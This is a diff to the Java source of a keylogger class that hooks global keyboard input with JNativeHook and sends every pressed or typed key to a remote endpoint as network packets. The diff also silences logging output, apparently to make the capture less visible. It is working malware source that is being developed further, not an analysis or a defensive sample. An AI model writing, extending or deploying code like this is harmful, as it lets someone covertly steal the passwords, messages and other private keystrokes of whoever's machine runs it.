@@ -1,7 +1,9 @@
 package me.sebsb;
 
 import java.io.PrintWriter;
+import java.util.Arrays;
 import java.util.logging.Level;
+import java.util.logging.LogManager;
 import java.util.logging.Logger;
 
 import org.jnativehook.GlobalScreen;
@@ -22,7 +24,9 @@ public class KeyLogger implements NativeKeyListener {
 		logger.setLevel(Level.OFF);
 		GlobalScreen.addNativeKeyListener(this);
 		this.pw = pw;
+		LogManager.getLogManager().reset();
 	}
+	
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent arg0) {
 		String text = NativeKeyEvent.getKeyText(arg0.getKeyCode());
@@ -41,7 +45,7 @@ public class KeyLogger implements NativeKeyListener {
 			}
 			if (!contains) {
 				changed = true;
-			}
+			} // lolol
 		} catch (Exception e) {
 			changed = true;
 		}
@@ -50,7 +54,14 @@ public class KeyLogger implements NativeKeyListener {
 		}
 		
 		if (changed) {
-			NetUtils.sendMessage(text, MessageType.KEYLOG, pw);
+			try {
+				Packet packet = new Packet();
+				packet.action = MessageType.KEYLOGGER.getID();
+				packet.data = Arrays.asList(new String[] {text});
+				NetUtils.sendMessage(packet, pw);
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 		}
 	}
 
@@ -59,10 +70,16 @@ public class KeyLogger implements NativeKeyListener {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {
-		
 		String text = arg0.getKeyChar() + "";
 		if (!text.equals(" ")) {
-			NetUtils.sendMessage(text, MessageType.KEYLOG, pw);
+			try {
+				Packet packet = new Packet();
+				packet.action = MessageType.KEYLOGGER.getID();
+				packet.data = Arrays.asList(new String[] {text});
+				NetUtils.sendMessage(packet, pw);
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 		}
 	}
 
